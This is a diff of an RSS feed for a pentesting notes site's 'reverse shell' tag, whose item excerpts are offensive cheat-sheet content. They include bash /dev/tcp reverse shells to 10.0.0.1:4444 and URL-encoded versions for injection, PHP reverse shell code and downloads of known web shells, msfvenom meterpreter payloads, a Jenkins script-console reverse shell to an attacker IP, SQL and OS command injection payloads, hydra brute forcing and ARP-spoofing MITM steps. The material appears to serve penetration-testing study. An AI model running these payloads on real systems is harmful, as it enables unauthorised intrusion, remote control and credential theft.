@@ -6,8 +6,22 @@
     <description>Recent content in Reverse Shell on D0CUM3NTN4T10N</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en</language>
-    <lastBuildDate>Thu, 14 Dec 2023 00:00:00 +0000</lastBuildDate>
+    <lastBuildDate>Sat, 23 Dec 2023 00:00:00 +0000</lastBuildDate>
     <atom:link href="https://documentnation.github.io/tags/reverse-shell/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Reverse Shell with Pwncat</title>
+      <link>https://documentnation.github.io/docs/hdks/shell/reverse-shell-with-pwncat/</link>
+      <pubDate>Sat, 23 Dec 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/shell/reverse-shell-with-pwncat/</guid>
+      <description>It can be downloaded from here.&#xA;For listening from remote connection, run the following command.&#xA;pwncat-cs -lp 4444 # For Windows target pwncat-cs -m windows -lp 4444 Commands linkAfter reverse connecting, we can execute commands either local or remote.&#xA;# Switch between Local and Remote shell Ctrl&amp;#43;D # Upload a file to target machine (e.g. upload example.txt from local to remote) (local) upload ./example.txt /tmp/example.txt </description>
+    </item>
+    <item>
+      <title>Reverse Shell Cheat Sheet</title>
+      <link>https://documentnation.github.io/docs/hdks/shell/reverse-shell-cheat-sheet/</link>
+      <pubDate>Thu, 14 Dec 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/shell/reverse-shell-cheat-sheet/</guid>
+      <description>Setup Listener linkFirst of all, we need to start a listener in local machine to get an incoming connection.&#xA;nc -lvnp 4444 # For more elegant shell, use `rlwrap`. # https://github.com/hanslub42/rlwrap rlwrap nc -lvnp 4444 Online Generator link Reverse Shell Generator Bash link bash -i &amp;gt;&amp;amp; /dev/tcp/10.0.0.1/4444 0&amp;gt;&amp;amp;1 bash -c &amp;#39;bash -i &amp;gt;&amp;amp; /dev/tcp/10.0.0.1/4444 0&amp;gt;&amp;amp;1&amp;#39; /bin/bash -c &amp;#39;bash -i &amp;gt;&amp;amp; /dev/tcp/10.0.0.1/4444 0&amp;gt;&amp;amp;1&amp;#39; # For URL param /?q=bash&amp;#43;-i&amp;#43;&amp;gt;%26&amp;#43;/dev/tcp/10.0.0.1/4444&amp;#43;0&amp;gt;%261 /?q=`bash&amp;#43;-c&amp;#43;&amp;#39;bash&amp;#43;-i&amp;#43;&amp;gt;%26&amp;#43;/dev/tcp/10.0.0.1/4444&amp;#43;0&amp;gt;%261&amp;#39;` with Base64 linkExecute the following commands in target machine.</description>
+    </item>
     <item>
       <title>SQL Injection Cheat Sheet</title>
       <link>https://documentnation.github.io/docs/hdks/web/security-risk/sql-injection-cheat-sheet/</link>
@@ -16,11 +30,32 @@
       <description>Comment Syntax linkComment syntax is depending on the database used in the website.&#xA;MSDB Comments MySQL -- - (add a space after --) # /*comment*/ /*!comment*/ MSSQL -- /*comment*/ Oracle -- PostgreSQL -- /*comment*/ SQLite -- /*comment*/ Basic Injection linkFirst off, check if we can inject SQL commands into forms or URL params in the target website.&#xA;&amp;#39; OR 1=1-- &amp;#39; OR 1=1-- - &amp;#39; OR 1=1# &amp;#39; OR &amp;#39;1&amp;#39;=&amp;#39;1&amp;#39;-- &amp;#39; OR &amp;#39;1&amp;#39;=&amp;#39;1&amp;#39;-- - &amp;#39; OR &amp;#39;1&amp;#39;=&amp;#39;1&amp;#39;# &amp;#39; OR &amp;#39;1&amp;#39;=&amp;#39;1-- &amp;#39; OR &amp;#39;1&amp;#39;=&amp;#39;1-- - &amp;#39; OR &amp;#39;1&amp;#39;=&amp;#39;1# &amp;#34; OR 1=1-- &amp;#34; OR 1=1-- - &amp;#34; OR 1=1# &amp;#39;) OR 1=1-- &amp;#39;) OR 1=1-- - &amp;#39;) OR 1=1# &amp;#39;; OR 1=1-- &amp;#39;; OR 1=1-- - &amp;#39;; OR 1=1# admin or 1=1-- admin or 1=1-- - admin or 1=1# WAF Bypass linkReference: https://owasp.</description>
     </item>
     <item>
+      <title>Web Reverse Shell</title>
+      <link>https://documentnation.github.io/docs/hdks/shell/web-reverse-shell/</link>
+      <pubDate>Tue, 21 Nov 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/shell/web-reverse-shell/</guid>
+      <description>PHP Reverse Shell (Linux) link # From local script (it&amp;#39;s stored by default in Kali or Parrot) cp /usr/share/webshell/php/php-reverse-shell.php ./shell.php # From repo (https://github.com/pentestmonkey/php-reverse-shell) wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php -O shell.php # From repo (https://github.com/flozz/p0wny-shell) wget https://raw.githubusercontent.com/flozz/p0wny-shell/master/shell.php -O shell.php Replace the $ip and the $port in the script with your local ip and port.&#xA;Without fsockopen, and for FreeBSD link &amp;lt;?php set_time_limit (0); $ip = &amp;#39;10.0.0.1&amp;#39;; // CHANGE THIS $port = 4444; // CHANGE THIS // Spawn shell process $descriptorspec = array( 0 =&amp;gt; array(&amp;#34;pipe&amp;#34;, &amp;#34;r&amp;#34;), // stdin is a pipe that the child will read from 1 =&amp;gt; array(&amp;#34;pipe&amp;#34;, &amp;#34;w&amp;#34;), // stdout is a pipe that the child will write to 2 =&amp;gt; array(&amp;#34;file&amp;#34;, &amp;#34;/tmp/error-output.</description>
+    </item>
+    <item>
       <title>OS Command Injection</title>
       <link>https://documentnation.github.io/docs/hdks/web/security-risk/os-command-injection/</link>
       <pubDate>Sat, 11 Nov 2023 00:00:00 +0000</pubDate>
       <guid>https://documentnation.github.io/docs/hdks/web/security-risk/os-command-injection/</guid>
       <description>Basic Payloads linkIf the payload includes whitespaces (&amp;rsquo; &amp;lsquo;), we need to change it to &amp;rsquo;+&amp;rsquo; or URL encoding (&amp;rsquo;%20&amp;rsquo;).&#xA;/api/cmd/whoami /command/whoami /?cmd=whoami /?cmd=;id /?cmd=ls /?cmd=ls .. /?cmd=ls ../ /?cmd=ls /home /?cmd=`ping -c 1 10.0.0.1` /?file=example.txt; echo $(ls -al /) /?file=example.txt; echo $(ls -al /) | &amp;lt;!-- PHP query string --&amp;gt; /?q=;system($_GET[cmd])&amp;amp;cmd=whoami /?q=${system($_GET[cmd])}&amp;amp;cmd=whoami /?productId=1&amp;amp;stockId=1|whoami /?productId=1&amp;amp;stockId=1|id &amp;lt;!-- Windows --&amp;gt; /?file=example.txt | systeminfo # /?file=example.txt ; systeminfo # /?file=example.txt&amp;#39;) ; systeminfo # URL Encoding linkWe may be able to bypass specific character filter by encoding them.</description>
+    </item>
+    <item>
+      <title>Reverse Shell with Metasploit</title>
+      <link>https://documentnation.github.io/docs/hdks/shell/reverse-shell-with-metasploit/</link>
+      <pubDate>Sat, 11 Nov 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/shell/reverse-shell-with-metasploit/</guid>
+      <description>Generate Reverse Shell Payload link1. Create a Payload using MsfVenom link # Linux msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf &amp;gt; shell.elf # Windows msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe -o shell.exe msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f aspx -o shell.aspx 2. Start Listener using MsfConsole link msfconsole msf&amp;gt; use exploit/multi/handler # Linux msf&amp;gt; set payload linux/x86/meterpreter/reverse_tcp # Windows msf&amp;gt; set payload windows/meterpreter/reverse_tcp # or msf&amp;gt; set payload windows/x64/meterpreter/reverse_tcp msf&amp;gt; set lhost 10.</description>
+    </item>
+    <item>
+      <title>FTP (File Transfer Protocol) Pentesting</title>
+      <link>https://documentnation.github.io/docs/hdks/network/protocol/ftp-pentesting/</link>
+      <pubDate>Mon, 30 Oct 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/network/protocol/ftp-pentesting/</guid>
+      <description>Enumeration link nmap --script ftp-anon -p 21 &amp;lt;target-ip&amp;gt; nmap --script ftp-vuln* -p 21 &amp;lt;target-ip&amp;gt; nmap --script ftp-* -p 21 &amp;lt;target-ip&amp;gt; Brute Force Credentials link hydra -l username -P passwords.txt &amp;lt;target-ip&amp;gt; ftp hydra -L username.txt -p password &amp;lt;target-ip&amp;gt; ftp hydra -l username -P passwords.txt ftp://&amp;lt;target-ip&amp;gt; hydra -L usernames.txt -p password ftp://&amp;lt;target-ip&amp;gt; Investigation linkBanner Grabbing link nc &amp;lt;target-ip&amp;gt; 21 Using OpenSSL linkFirst off, open listener.&#xA;nc -vn &amp;lt;target-ip&amp;gt; 21 Then run the command below.</description>
     </item>
     <item>
       <title>SQL Injection with Sqlmap</title>
@@ -44,6 +79,13 @@
       <description>Identify Where SQL Injection can be Performed linkThere are many places where SQLi can be performed. For example,&#xA;URL parameters POST parameters HTTP request headers (Cookie, User-Agent, etc.) Cheat Sheet linkTo see SQL injection cheat sheet, please refer to this page.</description>
     </item>
     <item>
+      <title>Upgrade to Fully Interactive TTY</title>
+      <link>https://documentnation.github.io/docs/hdks/shell/upgrade-to-fully-interactive-tty/</link>
+      <pubDate>Sat, 08 Apr 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/shell/upgrade-to-fully-interactive-tty/</guid>
+      <description>Upgrade linkAfter connecting to the target shell with reverse shell, it&amp;rsquo;s recommended to make the shell to be more elegant.&#xA;python3 -c &amp;#39;import pty; pty.spawn(&amp;#34;/bin/bash&amp;#34;)&amp;#39; # or python -c &amp;#39;import pty; pty.spawn(&amp;#34;/bin/bash&amp;#34;)&amp;#39; # or python2 -c &amp;#39;import pty; pty.spawn(&amp;#34;/bin/bash&amp;#34;)&amp;#39; # or SHELL=/bin/bash script -q /dev/null The commands below make our shell even more perfect.&#xA;Ctrl&amp;#43;z stty raw -echo;fg Enter x2 export TERM=xterm </description>
+    </item>
+    <item>
       <title>Ruby Privilege Escalation</title>
       <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/ruby-privilege-escalation/</link>
       <pubDate>Tue, 28 Mar 2023 00:00:00 +0000</pubDate>
@@ -63,6 +105,13 @@
       <pubDate>Sun, 01 Jan 2023 00:00:00 +0000</pubDate>
       <guid>https://documentnation.github.io/docs/hdks/web/jenkins-pentesting/</guid>
       <description>Brute Force Credentials link msfconsole msf &amp;gt; use auxiliary/scanner/http/jenkins_login Reverse Shell on Dashboard linkYou need to have the credential.&#xA;Opening Listener on Your Local Machine&#xA;nc -lvnp 4444 Login to Jenkins&#xA;Access &amp;ldquo;http://localhost:8080&amp;rdquo; in browser and login.&#xA;Click &amp;ldquo;Manage Jenkins&amp;rdquo; -&amp;gt; &amp;ldquo;Script Console&amp;rdquo;&#xA;Add the Payload in the Console&#xA;r = Runtime.getRuntime() p = r.exec([&amp;#34;/bin/bash&amp;#34;, &amp;#34;-c&amp;#34;, &amp;#34;exec 5&amp;lt;&amp;gt;/dev/tcp/&amp;lt;Attacker_IP&amp;gt;/4444; cat &amp;lt;&amp;amp;5 | while read line; do \$line 2&amp;gt;&amp;amp;5 &amp;gt;&amp;amp;5; done&amp;#34;] as String[]) p.</description>
+    </item>
+    <item>
+      <title>MITM (Man in the Middle) Attack</title>
+      <link>https://documentnation.github.io/docs/hdks/network/wifi/mitm-attack/</link>
+      <pubDate>Thu, 01 Dec 2022 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/network/wifi/mitm-attack/</guid>
+      <description>Establish MITM linkUsing ARP Spoofing linkIn the target machine,&#xA;# -T: text only GUI # -M: man-in-the-middle attack # -w: write .pcap file ettercap -T -i eth1 -M arp -w /tmp/ettercap.pcap ettercap -T -i eth1 -M arp -w /tmp/ettercap.pcap In your local machine, transfer the ettercap&amp;rsquo;s output file.&#xA;scp victim@&amp;lt;target-ip&amp;gt;:/tmp/ettercap.pcap . # Investigate the file wireshark ettercap.pcap Gain Access to a Shell linkReverse Shell Via ARP Spoofing linkIn the target machine, create &amp;ldquo;whoami.</description>
     </item>
     <item>
       <title>Pug Pentesting</title>
